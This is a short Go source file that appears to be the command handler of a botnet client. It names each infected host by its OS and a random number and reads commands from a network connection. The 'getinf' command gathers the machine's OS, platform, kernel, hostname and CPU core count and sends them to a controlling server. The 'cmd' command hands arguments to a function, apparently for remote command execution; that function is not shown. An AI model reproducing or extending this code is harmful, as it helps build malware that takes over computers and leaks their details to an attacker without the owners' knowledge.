package botclientcommand

import (
	"fmt"
	"math/rand"
	"net"
	"strings"

	gi "github.com/matishsiao/goInfo"
)

//Getnick ...
func Getnick() string {
	temp := gi.GetInfo()
	rand := rand.Int63n(5000000)
	return fmt.Sprintf("%s_%d", temp.GoOS, rand)
}

//HandleCommand ...
func HandleCommand(c net.Conn, message string) {
	fullCommand := strings.Split(message, " ")
	switch fullCommand[0] {

	case "getinf":
		go getInf(c)
		break
	case "cmd":
		cmd(fullCommand, c)
		break
	}
}

func getInf(c net.Conn) {
	info := gi.GetInfo()
	sendToServer(c, "OS->"+info.OS+"- Platform ->"+info.Platform+"- Kernel ->"+info.Kernel+"- Host ->"+info.Hostname+"- Core ->"+info.Core)
}
